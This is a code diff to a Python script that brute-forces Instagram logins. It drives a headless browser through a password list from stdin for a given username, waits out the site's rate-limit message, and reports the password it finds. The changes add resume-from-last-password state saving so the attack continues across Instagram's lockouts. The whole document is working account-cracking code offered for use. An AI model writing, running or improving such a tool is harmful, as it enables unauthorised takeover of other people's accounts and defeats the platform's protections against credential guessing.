@@ -5,6 +5,7 @@ import sys
 import time
 import logging
 from tqdm import tqdm
+import os
 
 # List of required packages
 required_packages = ['splinter', 'tqdm']
@@ -36,7 +37,8 @@ logging.basicConfig(filename='login_attempts.log', level=logging.INFO, format='%
 # Constants
 DEFAULT_WAIT_TIME = 11 * 60 + 35  # 11 minutes and 35 seconds
 problem_logging_in = "There was a problem logging you into Instagram. Please try again soon."
-MAX_RETRIES = 2000
+MAX_RETRIES = 5
+STATE_FILE = "last_attempt.txt"
 
 # Function to check login success
 def logInSuccess(browser):
@@ -71,6 +73,18 @@ def check_password_strength(password):
     else:
         return "strong"
 
+# Function to load the last attempted password
+def load_last_attempt():
+    if os.path.exists(STATE_FILE):
+        with open(STATE_FILE, 'r') as f:
+            return f.read().strip()
+    return None
+
+# Function to save the last attempted password
+def save_last_attempt(password):
+    with open(STATE_FILE, 'w') as f:
+        f.write(password)
+
 # Get command line arguments
 if len(sys.argv) < 2:
     print("Usage: python script.py <username> [timeout_seconds]")
@@ -85,6 +99,16 @@ correctPassword = None
 password_count = 0
 attempts = 0
 retry_count = 0
+last_attempted_password = load_last_attempt()
+
+# Read passwords from stdin
+passwords = sys.stdin.read().strip().splitlines()
+if last_attempted_password:
+    try:
+        start_index = passwords.index(last_attempted_password) + 1
+        passwords = passwords[start_index:]  # Resume from the last attempted password
+    except ValueError:
+        print("Last attempted password not found in the list. Starting from the beginning.")
 
 # Start the login process
 with Browser(browser_choice, headless=True) as browser:
@@ -95,8 +119,6 @@ with Browser(browser_choice, headless=True) as browser:
     login_button = browser.find_by_text('Log in').first
     username_form.fill(account_username)
 
-    # Read passwords from stdin
-    passwords = sys.stdin.read().strip().splitlines()
     total_passwords = len(passwords)
 
     for password in tqdm(passwords, desc="Testing passwords"):
@@ -115,6 +137,8 @@ with Browser(browser_choice, headless=True) as browser:
 
         if browser.is_text_present(problem_logging_in):
             print('Waiting for timeout to end...')
+            save_last_attempt(password)  # Save the last attempted password
+            
             retry_count += 1
             
             if retry_count >= MAX_RETRIES:
@@ -138,3 +162,7 @@ with Browser(browser_choice, headless=True) as browser:
     else:
         print(f"Password for username: {account_username} = {correctPassword}")
         logging.info(f"Password found: {correctPassword}")
+
+# Clean up the state file after successful login
+if correctPassword:
+    os.remove(STATE_FILE)
